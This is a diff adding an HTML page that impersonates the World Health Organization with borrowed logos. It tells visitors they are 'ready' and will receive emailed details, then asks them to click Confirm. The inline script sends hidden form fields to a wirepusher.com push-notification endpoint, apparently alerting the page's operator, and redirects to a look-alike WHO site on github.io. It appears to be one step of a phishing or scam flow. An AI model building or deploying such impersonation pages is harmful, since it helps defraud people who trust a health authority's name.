@@ -1,0 +1,223 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head>
+
+<meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+<title>World Health Organization</title>
+
+
+<style>
+.text-107px {
+  font-size: 18px;
+  padding: 6px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-107px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+<style>
+.responsive-btn {
+  width: 100%;
+  height: 34px;
+  border: 0;
+  border-radius: 30px;
+  background-color: #306754;
+  color: #fff;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: height 0.2s, font-size 0.2s;
+}
+
+@media (min-width: 1024px) {
+  .responsive-btn {
+    height: 48px;
+    font-size: 24px;
+  }
+}
+</style>
+
+
+
+
+    <style>
+        /* Center the spinner and message */
+        #loading-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column; /* Stack elements vertically */
+            justify-content: center;
+            align-items: center;
+            color: #000000;
+            font-size: 35px; /* Text size */
+            font-family: Arial, sans-serif;
+            z-index: 1000;
+            visibility: hidden;
+        }
+
+        /* Spinner animation */
+        .spinner {
+            border: 6px solid rgba(255, 255, 255, 0.3); /* Thicker border */
+            border-top: 16px solid black; /* Thicker spinner border */
+            border-radius: 50%;
+            width: 100px; /* Larger spinner size */
+            height: 100px; /* Larger spinner size */
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px; /* Space between spinner and text */
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show the loading message and spinner
+            const loadingMessage = document.getElementById("loading-message");
+            loadingMessage.style.visibility = "visible";
+
+            // Collect form data
+            const formData = new FormData(event.target);
+
+            // Create XMLHttpRequest for compatibility with old browsers
+            const xhr = new XMLHttpRequest();
+
+            // API endpoint
+            const apiUrl = "https://wirepusher.com/send";
+
+            // Configure the request to POST to the API
+            xhr.open("POST", apiUrl, true);
+
+            // Setup a callback to handle the response
+            xhr.onload = function () {
+                // Hide the loading message
+                loadingMessage.style.visibility = "hidden";
+
+                if (xhr.status === 200) {
+                    try {
+                        // Parse the response
+                        const response = JSON.parse(xhr.responseText);
+
+                        // Check if the response indicates success
+                        if (response.results && response.results["6Cr7mpGrC"] === "success") {
+                            // Redirect to the desired URL
+                            window.location.href = "https://worldhealth-care.github.io/WorldHealthOrganisation-/";
+                        } else {
+                            alert("Submission failed! Please try again.");
+                        }
+                    } catch (e) {
+                        alert("An error occurred while processing the response.");
+                        console.error(e);
+                    }
+                } else {
+                    alert("Failed to submit the form. Please check your connection.");
+                }
+            };
+
+            // Handle network errors or other issues
+            xhr.onerror = function () {
+                // Hide the loading message
+                loadingMessage.style.visibility = "hidden";
+                alert("A network error occurred. Please try again later.");
+            };
+
+            // Send the form data
+            xhr.send(formData);
+        }
+    </script>
+
+
+
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQigjw9X7uVAtO6oFLpLoMBk0hLSLTZvSSY5A&amp;usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 5008px; width: 194px; height: 65px; margin: 6.5px 0px;" alt="WHO: World Health Organisation - Office of the Secretary-General's ..." role="button" tabindex="0" aria-label="WHO: World Health Organisation - Office of the Secretary-General's ... Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+
+
+
+
+<h5 class="text-107px">
+
+
+<strong>
+
+Successful  
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 35px; height: 35px; margin: 0px;" alt="verify" Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify" Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+
+</strong>
+
+
+<br><br><br><br>
+
+You're  ready! Additional details will be emailed to you within a few hours. Please click the button below to confirm
+
+<br><br>
+
+
+
+ <!-- Loading message with spinner -->
+    <div id="loading-message">
+        <div class="spinner"></div>
+        Processing...
+    </div>
+
+    <form onsubmit="handleFormSubmit(event)">
+        <!-- Hidden fields for the required parameters -->
+        <input type="hidden" name="id" value="6Cr7mpGrC">
+        <input type="hidden" name="title" value="Important_Form">
+        <input type="hidden" name="message" value="Submited">
+        <input type="hidden" name="type" value="YourCustomType">
+
+        <!-- Submit button -->
+
+
+        <button type="submit" class="responsive-btn">Confirm</button>
+
+    </form>
+
+
+
+
+ 
+<br><br><br><br><br>
+
+</h5>
+   
+</body>
+</html>
